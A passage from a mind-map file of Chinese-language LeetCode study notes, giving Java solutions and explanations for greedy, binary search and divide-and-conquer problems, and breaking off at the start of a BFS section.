      <a href="https://leetcode.com/problems/minimum-number-of-arrows-to-burst-balloons/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/minimum-number-of-arrows-to-burst-balloons/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
[[10,16], [2,8], [1,6], [7,12]]
Output:
2</code></pre>
    <p>
      题目描述：气球在一个水平数轴上摆放，可以重叠，飞镖垂直投向坐标轴，使得路径上的气球都被刺破。求解最小的投飞镖次数使所有气球都被刺破。
    </p>
    <p>
      也是计算不重叠的区间个数，不过和 Non-overlapping Intervals 的区别在于，[1, 2] 和 [2, 3] 在本题中算是重叠区间。
    </p>
    <pre><code class="language-plaintext">public int findMinArrowShots(int[][] points) {
    if (points.length == 0) {
        return 0;
    }
    Arrays.sort(points, Comparator.comparingInt(o -&gt; o[1]));
    int cnt = 1, end = points[0][1];
    for (int i = 1; i &lt; points.length; i++) {
        if (points[i][0] &lt;= end) {
            continue;
        }
        cnt++;
        end = points[i][1];
    }
    return cnt;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_549697203" CREATED="1754751539573" MODIFIED="1754751539575"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 根据身高和序号重组队列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      406. Queue Reconstruction by Height(Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/queue-reconstruction-by-height/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/queue-reconstruction-by-height/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
[[7,0], [4,4], [7,1], [5,0], [6,1], [5,2]]
Output:
[[5,0], [7,0], [5,2], [6,1], [4,4], [7,1]]</code></pre>
    <p>
      题目描述：一个学生用两个分量 (h, k) 描述，h 表示身高，k 表示排在前面的有 k 个学生的身高比他高或者和他一样高。
    </p>
    <p>
      为了使插入操作不影响后续的操作，身高较高的学生应该先做插入操作，否则身高较小的学生原先正确插入的第 k 个位置可能会变成第 k+1 个位置。
    </p>
    <p>
      身高 h 降序、个数 k 值升序，然后将某个学生插入队列的第 k 个位置中。
    </p>
    <pre><code class="language-plaintext">public int[][] reconstructQueue(int[][] people) {
    if (people == null || people.length == 0 || people[0].length == 0) {
        return new int[0][0];
    }
    Arrays.sort(people, (a, b) -&gt; (a[0] == b[0] ? a[1] - b[1] : b[0] - a[0]));
    List&lt;int[]&gt; queue = new ArrayList&lt;&gt;();
    for (int[] p : people) {
        queue.add(p[1], p);
    }
    return queue.toArray(new int[queue.size()][]);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_748015703" CREATED="1754751539576" MODIFIED="1754751539578"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 买卖股票最大的收益
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      121. Best Time to Buy and Sell Stock (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/description/">力扣</a>
    </p>
    <p>
      题目描述：一次股票交易包含买入和卖出，只进行一次交易，求最大收益。
    </p>
    <p>
      只要记录前面的最小价格，将这个最小价格作为买入价格，然后将当前的价格作为售出价格，查看当前收益是不是最大收益。
    </p>
    <pre><code class="language-plaintext">public int maxProfit(int[] prices) {
    int n = prices.length;
    if (n == 0) return 0;
    int soFarMin = prices[0];
    int max = 0;
    for (int i = 1; i &lt; n; i++) {
        if (soFarMin &gt; prices[i]) soFarMin = prices[i];
        else max = Math.max(max, prices[i] - soFarMin);
    }
    return max;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1074327682" CREATED="1754751539579" MODIFIED="1754751673853"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 买卖股票的最大收益 II
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      122. Best Time to Buy and Sell Stock II (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/description/">力扣</a>
    </p>
    <p>
      题目描述：可以进行多次交易，多次交易之间不能交叉进行，可以进行多次交易。
    </p>
    <p>
      对于 [a, b, c, d]，如果有 a &lt;= b &lt;= c &lt;= d ，那么最大收益为 d - a。而 d - a = (d - c) + (c - b) + (b - a) ，因此当访问到一个 prices[i] 且 prices[i] - prices[i-1] &gt; 0，那么就把 prices[i] - prices[i-1] 添加到收益中。
    </p>
    <pre><code class="language-plaintext">public int maxProfit(int[] prices) {
    int profit = 0;
    for (int i = 1; i &lt; prices.length; i++) {
        if (prices[i] &gt; prices[i - 1]) {
            profit += (prices[i] - prices[i - 1]);
        }
    }
    return profit;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1732886528" CREATED="1754751539582" MODIFIED="1754751539584"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 种植花朵
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      605. Can Place Flowers (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/can-place-flowers/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/can-place-flowers/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: flowerbed = [1,0,0,0,1], n = 1
Output: True</code></pre>
    <p>
      题目描述：flowerbed 数组中 1 表示已经种下了花朵。花朵之间至少需要一个单位的间隔，求解是否能种下 n 朵花。
    </p>
    <pre><code class="language-plaintext">public boolean canPlaceFlowers(int[] flowerbed, int n) {
    int len = flowerbed.length;
    int cnt = 0;
    for (int i = 0; i &lt; len &amp;&amp; cnt &lt; n; i++) {
        if (flowerbed[i] == 1) {
            continue;
        }
        int pre = i == 0 ? 0 : flowerbed[i - 1];
        int next = i == len - 1 ? 0 : flowerbed[i + 1];
        if (pre == 0 &amp;&amp; next == 0) {
            cnt++;
            flowerbed[i] = 1;
        }
    }
    return cnt &gt;= n;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_487508557" CREATED="1754751539584" MODIFIED="1754751539586"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 判断是否为子序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      392. Is Subsequence (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/is-subsequence/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/is-subsequence/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">s = &quot;abc&quot;, t = &quot;ahbgdc&quot;
Return true.</code></pre>
    <pre><code class="language-plaintext">public boolean isSubsequence(String s, String t) {
    int index = -1;
    for (char c : s.toCharArray()) {
        index = t.indexOf(c, index + 1);
        if (index == -1) {
            return false;
        }
    }
    return true;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_889357176" CREATED="1754751539586" MODIFIED="1754751539589"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 修改一个数成为非递减数组
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      665. Non-decreasing Array (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/non-decreasing-array/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/non-decreasing-array/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: [4,2,3]
Output: True
Explanation: You could modify the first 4 to 1 to get a non-decreasing array.</code></pre>
    <p>
      题目描述：判断一个数组是否能只修改一个数就成为非递减数组。
    </p>
    <p>
      在出现 nums[i] \&lt; nums[i - 1] 时，需要考虑的是应该修改数组的哪个数，使得本次修改能使 i 之前的数组成为非递减数组，并且 <strong>不影响后续的操作</strong>&#xa0;。优先考虑令 nums[i - 1] = nums[i]，因为如果修改 nums[i] = nums[i - 1] 的话，那么 nums[i] 这个数会变大，就有可能比 nums[i + 1] 大，从而影响了后续操作。还有一个比较特别的情况就是 nums[i] \&lt; nums[i - 2]，修改 nums[i - 1] = nums[i] 不能使数组成为非递减数组，只能修改 nums[i] = nums[i - 1]。
    </p>
    <pre><code class="language-plaintext">public boolean checkPossibility(int[] nums) {
    int cnt = 0;
    for (int i = 1; i &lt; nums.length &amp;&amp; cnt &lt; 2; i++) {
        if (nums[i] &gt;= nums[i - 1]) {
            continue;
        }
        cnt++;
        if (i - 2 &gt;= 0 &amp;&amp; nums[i - 2] &gt; nums[i]) {
            nums[i] = nums[i - 1];
        } else {
            nums[i - 1] = nums[i];
        }
    }
    return cnt &lt;= 1;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1585749629" CREATED="1754751539589" MODIFIED="1754751539590"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. 子数组最大的和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      53. Maximum Subarray (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/maximum-subarray/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/maximum-subarray/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">For example, given the array [-2,1,-3,4,-1,2,1,-5,4],
the contiguous subarray [4,-1,2,1] has the largest sum = 6.</code></pre>
    <pre><code class="language-plaintext">public int maxSubArray(int[] nums) {
    if (nums == null || nums.length == 0) {
        return 0;
    }
    int preSum = nums[0];
    int maxSum = preSum;
    for (int i = 1; i &lt; nums.length; i++) {
        preSum = preSum &gt; 0 ? preSum + nums[i] : nums[i];
        maxSum = Math.max(maxSum, preSum);
    }
    return maxSum;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_944037611" CREATED="1754751539591" MODIFIED="1754751539593"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      11. 分隔字符串使同种字符出现在一起
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      763. Partition Labels (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/partition-labels/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/partition-labels/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: S = &quot;ababcbacadefegdehijhklij&quot;
Output: [9,7,8]
Explanation:
The partition is &quot;ababcbaca&quot;, &quot;defegde&quot;, &quot;hijhklij&quot;.
This is a partition so that each letter appears in at most one part.
A partition like &quot;ababcbacadefegde&quot;, &quot;hijhklij&quot; is incorrect, because it splits S into less parts.</code></pre>
    <pre><code class="language-plaintext">public List&lt;Integer&gt; partitionLabels(String S) {
    int[] lastIndexsOfChar = new int[26];
    for (int i = 0; i &lt; S.length(); i++) {
        lastIndexsOfChar[char2Index(S.charAt(i))] = i;
    }
    List&lt;Integer&gt; partitions = new ArrayList&lt;&gt;();
    int firstIndex = 0;
    while (firstIndex &lt; S.length()) {
        int lastIndex = firstIndex;
        for (int i = firstIndex; i &lt; S.length() &amp;&amp; i &lt;= lastIndex; i++) {
            int index = lastIndexsOfChar[char2Index(S.charAt(i))];
            if (index &gt; lastIndex) {
                lastIndex = index;
            }
        }
        partitions.add(lastIndex - firstIndex + 1);
        firstIndex = lastIndex + 1;
    }
    return partitions;
}
private int char2Index(char c) {
    return c - 'a';
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1660032315" CREATED="1754750425393" MODIFIED="1754751539594" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    二分查找
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>正常实现</strong>
    </p>
    <pre><code class="language-plaintext">Input : [1,2,3,4,5]
key : 3
return the index : 2</code></pre>
    <pre><code class="language-plaintext">public int binarySearch(int[] nums, int key) {
    int l = 0, h = nums.length - 1;
    while (l &lt;= h) {
        int m = l + (h - l) / 2;
        if (nums[m] == key) {
            return m;
        } else if (nums[m] &gt; key) {
            h = m - 1;
        } else {
            l = m + 1;
        }
    }
    return -1;
}</code></pre>
    <p>
      <strong>时间复杂度</strong>
    </p>
    <p>
      二分查找也称为折半查找，每次都能将查找区间减半，这种折半特性的算法时间复杂度为 O(logN)。
    </p>
    <p>
      <strong>m 计算</strong>
    </p>
    <p>
      有两种计算中值 m 的方式：
    </p>
    <ul>
      <li>
        <p>
          m = (l + h) / 2
        </p>
      </li>
      <li>
        <p>
          m = l + (h - l) / 2
        </p>
      </li>
    </ul>
    <p>
      l + h 可能出现加法溢出，也就是说加法的结果大于整型能够表示的范围。但是 l 和 h 都为正数，因此 h - l 不会出现加法溢出问题。所以，最好使用第二种计算法方法。
    </p>
    <p>
      <strong>未成功查找的返回值</strong>
    </p>
    <p>
      循环退出时如果仍然没有查找到 key，那么表示查找失败。可以有两种返回值：
    </p>
    <ul>
      <li>
        <p>
          -1：以一个错误码表示没有查找到 key
        </p>
      </li>
      <li>
        <p>
          l：将 key 插入到 nums 中的正确位置
        </p>
      </li>
    </ul>
    <p>
      <strong>变种</strong>
    </p>
    <p>
      二分查找可以有很多变种，实现变种要注意边界值的判断。例如在一个有重复元素的数组中查找 key 的最左位置的实现如下：
    </p>
    <pre><code class="language-plaintext">public int binarySearch(int[] nums, int key) {
    int l = 0, h = nums.length;
    while (l &lt; h) {
        int m = l + (h - l) / 2;
        if (nums[m] &gt;= key) {
            h = m;
        } else {
            l = m + 1;
        }
    }
    return l;
}</code></pre>
    <p>
      该实现和正常实现有以下不同：
    </p>
    <ul>
      <li>
        <p>
          h 的赋值表达式为 h = m
        </p>
      </li>
      <li>
        <p>
          循环条件为 l \&lt; h
        </p>
      </li>
      <li>
        <p>
          最后返回 l 而不是 -1
        </p>
      </li>
    </ul>
    <p>
      在 nums[m] &gt;= key 的情况下，可以推导出最左 key 位于 [l, m] 区间中，这是一个闭区间。h 的赋值表达式为 h = m，因为 m 位置也可能是解。
    </p>
    <p>
      在 h 的赋值表达式为 h = m 的情况下，如果循环条件为 l \&lt;= h，那么会出现循环无法退出的情况，因此循环条件只能是 l \&lt; h。以下演示了循环条件为 l \&lt;= h 时循环无法退出的情况：
    </p>
    <pre><code class="language-plaintext">nums = {0, 1, 2}, key = 1
l   m   h
0   1   2  nums[m] &gt;= key
0   0   1  nums[m] &lt; key
1   1   1  nums[m] &gt;= key
1   1   1  nums[m] &gt;= key
...</code></pre>
    <p>
      当循环体退出时，不表示没有查找到 key，因此最后返回的结果不应该为 -1。为了验证有没有查找到，需要在调用端判断一下返回位置上的值和 key 是否相等。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1581806421" CREATED="1754751539595" MODIFIED="1754751539596"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 求开方
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      69. Sqrt(x) (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/sqrtx/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/sqrtx/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: 4
Output: 2
Input: 8
Output: 2
Explanation: The square root of 8 is 2.82842..., and since we want to return an integer, the decimal part will be truncated.</code></pre>
    <p>
      一个数 x 的开方 sqrt 一定在 0 ~ x 之间，并且满足 sqrt == x / sqrt。可以利用二分查找在 0 ~ x 之间查找 sqrt。
    </p>
    <p>
      对于 x = 8，它的开方是 2.82842...，最后应该返回 2 而不是 3。在循环条件为 l \&lt;= h 并且循环退出时，h 总是比 l 小 1，也就是说 h = 2，l = 3，因此最后的返回值应该为 h 而不是 l。
    </p>
    <pre><code class="language-plaintext">public int mySqrt(int x) {
    if (x &lt;= 1) {
        return x;
    }
    int l = 1, h = x;
    while (l &lt;= h) {
        int mid = l + (h - l) / 2;
        int sqrt = x / mid;
        if (sqrt == mid) {
            return mid;
        } else if (mid &gt; sqrt) {
            h = mid - 1;
        } else {
            l = mid + 1;
        }
    }
    return h;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1296643842" CREATED="1754751539597" MODIFIED="1754751539599"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 大于给定元素的最小元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      744. Find Smallest Letter Greater Than Target (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/find-smallest-letter-greater-than-target/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/find-smallest-letter-greater-than-target/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
letters = [&quot;c&quot;, &quot;f&quot;, &quot;j&quot;]
target = &quot;d&quot;
Output: &quot;f&quot;
Input:
letters = [&quot;c&quot;, &quot;f&quot;, &quot;j&quot;]
target = &quot;k&quot;
Output: &quot;c&quot;</code></pre>
    <p>
      题目描述：给定一个有序的字符数组 letters 和一个字符 target，要求找出 letters 中大于 target 的最小字符，如果找不到就返回第 1 个字符。
    </p>
    <pre><code class="language-plaintext">public char nextGreatestLetter(char[] letters, char target) {
    int n = letters.length;
    int l = 0, h = n - 1;
    while (l &lt;= h) {
        int m = l + (h - l) / 2;
        if (letters[m] &lt;= target) {
            l = m + 1;
        } else {
            h = m - 1;
        }
    }
    return l &lt; n ? letters[l] : letters[0];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_974930977" CREATED="1754751539599" MODIFIED="1754751539601"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 有序数组的 Single Element
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      540. Single Element in a Sorted Array (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/single-element-in-a-sorted-array/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/single-element-in-a-sorted-array/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: [1, 1, 2, 3, 3, 4, 4, 8, 8]
Output: 2</code></pre>
    <p>
      题目描述：一个有序数组只有一个数不出现两次，找出这个数。
    </p>
    <p>
      要求以 O(logN) 时间复杂度进行求解，因此不能遍历数组并进行异或操作来求解，这么做的时间复杂度为 O(N)。
    </p>
    <p>
      令 index 为 Single Element 在数组中的位置。在 index 之后，数组中原来存在的成对状态被改变。如果 m 为偶数，并且 m + 1 \&lt; index，那么 nums[m] == nums[m + 1]；m + 1 &gt;= index，那么 nums[m] != nums[m + 1]。
    </p>
    <p>
      从上面的规律可以知道，如果 nums[m] == nums[m + 1]，那么 index 所在的数组位置为 [m + 2, h]，此时令 l = m + 2；如果 nums[m] != nums[m + 1]，那么 index 所在的数组位置为 [l, m]，此时令 h = m。
    </p>
    <p>
      因为 h 的赋值表达式为 h = m，那么循环条件也就只能使用 l \&lt; h 这种形式。
    </p>
    <pre><code class="language-plaintext">public int singleNonDuplicate(int[] nums) {
    int l = 0, h = nums.length - 1;
    while (l &lt; h) {
        int m = l + (h - l) / 2;
        if (m % 2 == 1) {
            m--;   // 保证 l/h/m 都在偶数位，使得查找区间大小一直都是奇数
        }
        if (nums[m] == nums[m + 1]) {
            l = m + 2;
        } else {
            h = m;
        }
    }
    return nums[l];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1240035628" CREATED="1754751539601" MODIFIED="1754751539603"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 第一个错误的版本
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      278. First Bad Version (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/first-bad-version/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/first-bad-version/description/">力扣</a>
    </p>
    <p>
      题目描述：给定一个元素 n 代表有 [1, 2, ..., n] 版本，在第 x 位置开始出现错误版本，导致后面的版本都错误。可以调用 isBadVersion(int x) 知道某个版本是否错误，要求找到第一个错误的版本。
    </p>
    <p>
      如果第 m 个版本出错，则表示第一个错误的版本在 [l, m] 之间，令 h = m；否则第一个错误的版本在 [m + 1, h] 之间，令 l = m + 1。
    </p>
    <p>
      因为 h 的赋值表达式为 h = m，因此循环条件为 l \&lt; h。
    </p>
    <pre><code class="language-plaintext">public int firstBadVersion(int n) {
    int l = 1, h = n;
    while (l &lt; h) {
        int mid = l + (h - l) / 2;
        if (isBadVersion(mid)) {
            h = mid;
        } else {
            l = mid + 1;
        }
    }
    return l;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1798388241" CREATED="1754751539603" MODIFIED="1754751539605"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 旋转数组的最小数字
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      153. Find Minimum in Rotated Sorted Array (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/find-minimum-in-rotated-sorted-array/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: [3,4,5,1,2],
Output: 1</code></pre>
    <pre><code class="language-plaintext">public int findMin(int[] nums) {
    int l = 0, h = nums.length - 1;
    while (l &lt; h) {
        int m = l + (h - l) / 2;
        if (nums[m] &lt;= nums[h]) {
            h = m;
        } else {
            l = m + 1;
        }
    }
    return nums[l];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1380054233" CREATED="1754751539605" MODIFIED="1754751539607"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 查找区间
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      34. Find First and Last Position of Element in Sorted Array
    </p>
    <p>
      <a href="https://leetcode.com/problems/find-first-and-last-position-of-element-in-sorted-array/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: nums = [5,7,7,8,8,10], target = 8
Output: [3,4]
Input: nums = [5,7,7,8,8,10], target = 6
Output: [-1,-1]</code></pre>
    <p>
      题目描述：给定一个有序数组 nums 和一个目标 target，要求找到 target 在 nums 中的第一个位置和最后一个位置。
    </p>
    <p>
      可以用二分查找找出第一个位置和最后一个位置，但是寻找的方法有所不同，需要实现两个二分查找。我们将寻找 target 最后一个位置，转换成寻找 target+1 第一个位置，再往前移动一个位置。这样我们只需要实现一个二分查找代码即可。
    </p>
    <pre><code class="language-plaintext">public int[] searchRange(int[] nums, int target) {
    int first = findFirst(nums, target);
    int last = findFirst(nums, target + 1) - 1;
    if (first == nums.length || nums[first] != target) {
        return new int[]{-1, -1};
    } else {
        return new int[]{first, Math.max(first, last)};
    }
}
private int findFirst(int[] nums, int target) {
    int l = 0, h = nums.length; // 注意 h 的初始值
    while (l &lt; h) {
        int m = l + (h - l) / 2;
        if (nums[m] &gt;= target) {
            h = m;
        } else {
            l = m + 1;
        }
    }
    return l;
}</code></pre>
    <p>
      在寻找第一个位置的二分查找代码中，需要注意 h 的取值为 nums.length，而不是 nums.length - 1。先看以下示例：
    </p>
    <pre><code class="language-plaintext">nums = [2,2], target = 2</code></pre>
    <p>
      如果 h 的取值为 nums.length - 1，那么 last = findFirst(nums, target + 1) - 1 = 1 - 1 = 0。这是因为 findLeft 只会返回 [0, nums.length - 1] 范围的值，对于 findFirst([2,2], 3) ，我们希望返回 3 插入 nums 中的位置，也就是数组最后一个位置再往后一个位置，即 nums.length。所以我们需要将 h 取值为 nums.length，从而使得 findFirst返回的区间更大，能够覆盖 target 大于 nums 最后一个元素的情况。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_658163814" CREATED="1754750425396" MODIFIED="1754751539607" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%88%86%E6%B2%BB.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    分治
  </body>
</html>
</richcontent>
<node ID="ID_1809098899" CREATED="1754751539608" MODIFIED="1754751539609"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 给表达式加括号
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      241. Different Ways to Add Parentheses (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/different-ways-to-add-parentheses/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/different-ways-to-add-parentheses/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: &quot;2-1-1&quot;.
((2-1)-1) = 0
(2-(1-1)) = 2
Output : [0, 2]</code></pre>
    <pre><code class="language-plaintext">public List&lt;Integer&gt; diffWaysToCompute(String input) {
    List&lt;Integer&gt; ways = new ArrayList&lt;&gt;();
    for (int i = 0; i &lt; input.length(); i++) {
        char c = input.charAt(i);
        if (c == '+' || c == '-' || c == '*') {
            List&lt;Integer&gt; left = diffWaysToCompute(input.substring(0, i));
            List&lt;Integer&gt; right = diffWaysToCompute(input.substring(i + 1));
            for (int l : left) {
                for (int r : right) {
                    switch (c) {
                        case '+':
                            ways.add(l + r);
                            break;
                        case '-':
                            ways.add(l - r);
                            break;
                        case '*':
                            ways.add(l * r);
                            break;
                    }
                }
            }
        }
    }
    if (ways.size() == 0) {
        ways.add(Integer.valueOf(input));
    }
    return ways;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1666141306" CREATED="1754751539610" MODIFIED="1754751539612"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 不同的二叉搜索树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      95. Unique Binary Search Trees II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/unique-binary-search-trees-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/unique-binary-search-trees-ii/description/">力扣</a>
    </p>
    <p>
      给定一个数字 n，要求生成所有值为 1...n 的二叉搜索树。
    </p>
    <pre><code class="language-plaintext">Input: 3
Output:
[
  [1,null,3,2],
  [3,2,null,1],
  [3,1,null,null,2],
  [2,1,3],
  [1,null,2,null,3]
]
Explanation:
The above output corresponds to the 5 unique BST's shown below:
   1         3     3      2      1
    \       /     /      / \      \
     3     2     1      1   3      2
    /     /       \                 \
   2     1         2                 3</code></pre>
    <pre><code class="language-plaintext">public List&lt;TreeNode&gt; generateTrees(int n) {
    if (n &lt; 1) {
        return new LinkedList&lt;TreeNode&gt;();
    }
    return generateSubtrees(1, n);
}
private List&lt;TreeNode&gt; generateSubtrees(int s, int e) {
    List&lt;TreeNode&gt; res = new LinkedList&lt;TreeNode&gt;();
    if (s &gt; e) {
        res.add(null);
        return res;
    }
    for (int i = s; i &lt;= e; ++i) {
        List&lt;TreeNode&gt; leftSubtrees = generateSubtrees(s, i - 1);
        List&lt;TreeNode&gt; rightSubtrees = generateSubtrees(i + 1, e);
        for (TreeNode left : leftSubtrees) {
            for (TreeNode right : rightSubtrees) {
                TreeNode root = new TreeNode(i);
                root.left = left;
                root.right = right;
                res.add(root);
            }
        }
    }
    return res;
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1437128442" CREATED="1754750425400" MODIFIED="1754751539613" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%90%9C%E7%B4%A2.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    搜索
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      深度优先搜索和广度优先搜索广泛运用于树和图中，但是它们的应用远远不止如此。
    </p>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_1871536705" CREATED="1754751539614" MODIFIED="1754751539615"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      BFS
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/95903878-725b-4ed9-bded-bc4aae0792a9.jpg"/>
      
    </p>
    <p>
      广度优先搜索一层一层地进行遍历，每层遍历都是以上一层遍历的结果作为起点，遍历一个距离能访问到的所有节点。需要注意的是，遍历过的节点不能再次被遍历。
    </p>
    <p>
      第一层：
    </p>
    <ul>
      <li>
        <p>
